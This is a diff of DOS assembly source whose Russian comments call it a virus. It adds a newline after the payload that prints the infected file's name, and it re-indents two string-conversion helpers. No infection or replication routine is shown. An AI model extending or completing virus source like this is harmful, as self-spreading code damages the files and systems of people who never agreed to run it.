@@ -132,9 +132,18 @@ file_open:
     ; PAYLOAD BEGIN
 
     ; полезная нагрузка вируса (вывод на экран имя зараженного файла)
+    ; вывод названия зараженного файла
     lea dx, [bp + file.fname]
     call str_f2c
     mov ah, 09h
+    int 21h
+
+    ; ввод переноса строки на новую строку и 
+    lea dx, word_buffer
+    mov byte ptr word_buffer[0], 13
+    mov byte ptr word_buffer[1], '$'
+    int 21h
+    mov byte ptr word_buffer[0], 10
     int 21h
     call str_c2f
 
@@ -153,11 +162,11 @@ procedures:
         push bx
         mov cx, 13
         str_f2c_lp:
-        mov bx, dx
-        add bx, 13
-        sub bx, cx
-        cmp byte ptr[bx], 0
-        jz str_f2c_ch
+            mov bx, dx
+            add bx, 13
+            sub bx, cx
+            cmp byte ptr[bx], 0
+            jz str_f2c_ch
         loop str_f2c_lp
         str_f2c_popret:
         pop bx
@@ -174,11 +183,11 @@ procedures:
         push bx
         mov cx, 13
         str_c2f_lp:
-        mov bx, dx
-        add bx, 13
-        sub bx, cx
-        cmp byte ptr[bx], '$'
-        jz str_c2f_ch
+            mov bx, dx
+            add bx, 13
+            sub bx, cx
+            cmp byte ptr[bx], '$'
+            jz str_c2f_ch
         loop str_c2f_lp
         str_c2f_popret:
         pop bx
